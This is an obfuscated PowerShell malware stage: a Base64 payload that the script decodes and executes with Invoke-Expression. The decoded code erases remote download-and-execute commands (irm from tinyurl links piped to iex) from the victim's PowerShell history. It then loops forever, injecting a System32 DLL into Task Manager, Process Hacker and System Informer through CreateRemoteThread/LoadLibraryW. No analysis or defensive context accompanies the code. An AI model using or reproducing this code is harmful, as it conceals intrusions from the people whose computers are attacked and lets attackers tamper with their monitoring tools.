$payload = 'IyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIDEpIENsZWFuIFBvd2VyU2hlbGwgaGlzdG9yeQ0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiRoaXN0b3J5RmlsZSA9ICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRsaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0Ig0KDQokYmxvY2tlZENvbW1hbmRzID0gQCgNCiAgICAgJ3Bvd2Vyc2hlbGwgLWVwIGJ5cGFzcyAtYyAiaXJtIGh0dHBzOi8vdGlueXVybC5jb20vQ2xhcmtzU2V0dXAgfCBpZXgiJywNCiAgICAgJ3Bvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtZXAgYnlwYXNzIC1jICJpcm0gaHR0cHM6Ly90aW55dXJsLmNvbS9DbGFya1hpbmplY3QgfCBpZXgiJywNCiAgICAgJ3Bvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtZXAgYnlwYXNzIC1jICJpcm0gaHR0cHM6Ly90aW55dXJsLmNvbS9DbGFya1hoaWRlIHwgaWV4IicNCikNCg0KaWYgKFRlc3QtUGF0aCAkaGlzdG9yeUZpbGUpIHsNCiAgICAkaGlzdG9yeSA9IEdldC1Db250ZW50ICRoaXN0b3J5RmlsZQ0KDQogICAgJGZpbHRlcmVkID0gJGhpc3RvcnkgfCBXaGVyZS1PYmplY3Qgew0KICAgICAgICAka2VlcCA9ICR0cnVlDQogICAgICAgIGZvcmVhY2ggKCRjbWQgaW4gJGJsb2NrZWRDb21tYW5kcykgew0KICAgICAgICAgICAgaWYgKCRfIC1saWtlICIqJGNtZCoiKSB7DQogICAgICAgICAgICAgICAgJGtlZXAgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAka2VlcA0KICAgIH0NCg0KICAgIFNldC1Db250ZW50ICRoaXN0b3J5RmlsZSAtVmFsdWUgJGZpbHRlcmVkIC1FbmNvZGluZyBVVEY4DQogICAgV3JpdGUtSG9zdCAiWytdIFBvd2VyU2hlbGwgaGlzdG9yeSBjbGVhbmVkLiIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KfSBlbHNlIHsNCiAgICBXcml0ZS1Ib3N0ICJbLV0gSGlzdG9yeSBmaWxlIG5vdCBmb3VuZCBhdCAkaGlzdG9yeUZpbGUiIC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93DQp9DQoNCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyAyKSBETEwgSW5qZWN0b3IgTG9vcA0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiRkbGxGb2xkZXIgPSAiQzpcV2luZG93c1xTeXN0ZW0zMiINCiRkbGwxID0gIkFwb24uZGxsIg0KJGRsbDFQYXRoID0gSm9pbi1QYXRoICRkbGxGb2xkZXIgJGRsbDENCiR0YXJnZXRQcm9jZXNzZXMgPSBAKCJUYXNrbWdyIiwgIlByb2Nlc3NIYWNrZXIiLCAiU3lzdGVtSW5mb3JtZXIiKQ0KJGluamVjdGVkUElEcyA9IEB7fQ0KDQokaW5qZWN0b3JDb2RlID0gQCINCnVzaW5nIFN5c3RlbTsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KDQpwdWJsaWMgY2xhc3MgSW5qZWN0b3INCnsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblByb2Nlc3MoaW50IGR3RGVzaXJlZEFjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IGR3UHJvY2Vzc0lkKTsNCg0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2NFeChJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCB1aW50IGZsQWxsb2NhdGlvblR5cGUsIHVpbnQgZmxQcm90ZWN0KTsNCg0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgV3JpdGVQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIGJ5dGVbXSBidWZmZXIsIHVpbnQgc2l6ZSwgb3V0IFVJbnRQdHIgd3JpdHRlbik7DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0TW9kdWxlSGFuZGxlKHN0cmluZyBscE1vZHVsZU5hbWUpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVJlbW90ZVRocmVhZChJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscFRocmVhZEF0dHJpYnV0ZXMsDQogICAgICAgIHVpbnQgZHdTdGFja1NpemUsIEludFB0ciBscFN0YXJ0QWRkcmVzcywgSW50UHRyIGxwUGFyYW1ldGVyLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwVGhyZWFkSWQpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7DQoNCiAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NfQ1JFQVRFX1RIUkVBRCA9IDB4MDAwMjsNCiAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NfUVVFUllfSU5GT1JNQVRJT04gPSAweDA0MDA7DQogICAgcHVibGljIGNvbnN0IGludCBQUk9DRVNTX1ZNX09QRVJBVElPTiA9IDB4MDAwODsNCiAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NfVk1fV1JJVEUgPSAweDAwMjA7DQogICAgcHVibGljIGNvbnN0IGludCBQUk9DRVNTX1ZNX1JFQUQgPSAweDAwMTA7DQoNCiAgICBwdWJsaWMgY29uc3QgdWludCBNRU1fQ09NTUlUID0gMHgwMDAwMTAwMDsNCiAgICBwdWJsaWMgY29uc3QgdWludCBNRU1fUkVTRVJWRSA9IDB4MDAwMDIwMDA7DQogICAgcHVibGljIGNvbnN0IHVpbnQgUEFHRV9SRUFEV1JJVEUgPSAweDA0Ow0KDQogICAgcHVibGljIHN0YXRpYyBib29sIEluamVjdChpbnQgcGlkLCBzdHJpbmcgZGxsUGF0aCkNCiAgICB7DQogICAgICAgIEludFB0ciBoUHJvY2VzcyA9IE9wZW5Qcm9jZXNzKFBST0NFU1NfQ1JFQVRFX1RIUkVBRCB8IFBST0NFU1NfUVVFUllfSU5GT1JNQVRJT04gfCBQUk9DRVNTX1ZNX09QRVJBVElPTiB8IFBST0NFU1NfVk1fV1JJVEUgfCBQUk9DRVNTX1ZNX1JFQUQsIGZhbHNlLCBwaWQpOw0KICAgICAgICBpZiAoaFByb2Nlc3MgPT0gSW50UHRyLlplcm8pDQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQoNCiAgICAgICAgSW50UHRyIGFsbG9jTWVtQWRkcmVzcyA9IFZpcnR1YWxBbGxvY0V4KGhQcm9jZXNzLCBJbnRQdHIuWmVybywgKHVpbnQpKChkbGxQYXRoLkxlbmd0aCArIDEpICogTWFyc2hhbC5TaXplT2YodHlwZW9mKGNoYXIpKSksDQogICAgICAgICAgICBNRU1fQ09NTUlUIHwgTUVNX1JFU0VSVkUsIFBBR0VfUkVBRFdSSVRFKTsNCiAgICAgICAgaWYgKGFsbG9jTWVtQWRkcmVzcyA9PSBJbnRQdHIuWmVybykNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KICAgICAgICBieXRlW10gYnl0ZXMgPSBFbmNvZGluZy5Vbmljb2RlLkdldEJ5dGVzKGRsbFBhdGgpOw0KICAgICAgICBVSW50UHRyIGJ5dGVzV3JpdHRlbjsNCiAgICAgICAgYm9vbCByZXN1bHQgPSBXcml0ZVByb2Nlc3NNZW1vcnkoaFByb2Nlc3MsIGFsbG9jTWVtQWRkcmVzcywgYnl0ZXMsICh1aW50KWJ5dGVzLkxlbmd0aCwgb3V0IGJ5dGVzV3JpdHRlbik7DQogICAgICAgIGlmICghcmVzdWx0IHx8IGJ5dGVzV3JpdHRlbi5Ub1VJbnQzMigpICE9IGJ5dGVzLkxlbmd0aCkNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KICAgICAgICBJbnRQdHIga2VybmVsMzJIYW5kbGUgPSBHZXRNb2R1bGVIYW5kbGUoImtlcm5lbDMyLmRsbCIpOw0KICAgICAgICBJbnRQdHIgbG9hZExpYnJhcnlBZGRyID0gR2V0UHJvY0FkZHJlc3Moa2VybmVsMzJIYW5kbGUsICJMb2FkTGlicmFyeVciKTsNCiAgICAgICAgaWYgKGxvYWRMaWJyYXJ5QWRkciA9PSBJbnRQdHIuWmVybykNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KICAgICAgICBJbnRQdHIgcmVtb3RlVGhyZWFkID0gQ3JlYXRlUmVtb3RlVGhyZWFkKGhQcm9jZXNzLCBJbnRQdHIuWmVybywgMCwgbG9hZExpYnJhcnlBZGRyLCBhbGxvY01lbUFkZHJlc3MsIDAsIEludFB0ci5aZXJvKTsNCiAgICAgICAgaWYgKHJlbW90ZVRocmVhZCA9PSBJbnRQdHIuWmVybykNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KICAgICAgICBDbG9zZUhhbmRsZShoUHJvY2Vzcyk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCn0NCiJADQoNCkFkZC1UeXBlIC1UeXBlRGVmaW5pdGlvbiAkaW5qZWN0b3JDb2RlIC1MYW5ndWFnZSBDU2hhcnANCg0KV3JpdGUtT3V0cHV0ICJNb25pdG9yaW5nIHByb2Nlc3NlczogJCgkdGFyZ2V0UHJvY2Vzc2VzIC1qb2luICcsICcpLi4uIg0KDQp3aGlsZSAoJHRydWUpIHsNCiAgICBmb3JlYWNoICgkcHJvY2Vzc05hbWUgaW4gJHRhcmdldFByb2Nlc3Nlcykgew0KICAgICAgICAkcHJvY3MgPSBHZXQtUHJvY2VzcyAtTmFtZSAkcHJvY2Vzc05hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgZm9yZWFjaCAoJHByb2MgaW4gJHByb2NzKSB7DQogICAgICAgICAgICBpZiAoLW5vdCAkaW5qZWN0ZWRQSURzLkNvbnRhaW5zS2V5KCRwcm9jLklkKSkgew0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiSW5qZWN0aW5nIGludG8gJHByb2Nlc3NOYW1lIg0KICAgICAgICAgICAgICAgICRzdWNjZXNzID0gW0luamVjdG9yXTo6SW5qZWN0KCRwcm9jLklkLCAkZGxsMVBhdGgpDQogICAgICAgICAgICAgICAgaWYgKCRzdWNjZXNzKSB7DQogICAgICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIlsrXSBEb25lIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQogICAgICAgICAgICAgICAgICAgICRpbmplY3RlZFBJRHNbJHByb2MuSWRdID0gJHRydWUNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJGYWlsZWQgdG8gaW5qZWN0IiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICAgICAjIFJlbW92ZSBleGl0ZWQgcHJvY2Vzc2VzIGZyb20gdHJhY2tpbmcNCiAgICAgICAgZm9yZWFjaCAoJHByb2NJZCBpbiBAKCRpbmplY3RlZFBJRHMuS2V5cykpIHsNCiAgICAgICAgICAgIGlmICgtbm90IChHZXQtUHJvY2VzcyAtSWQgJHByb2NJZCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsNCiAgICAgICAgICAgICAgICAkaW5qZWN0ZWRQSURzLlJlbW92ZSgkcHJvY0lkKQ0KICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiUHJvY2VzcyB3aXRoIFBJRCAkcHJvY0lkIGhhcyBleGl0ZWQuIE1vbml0b3JpbmcgYWdhaW4uIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCg0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDENCn0NCg==';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;
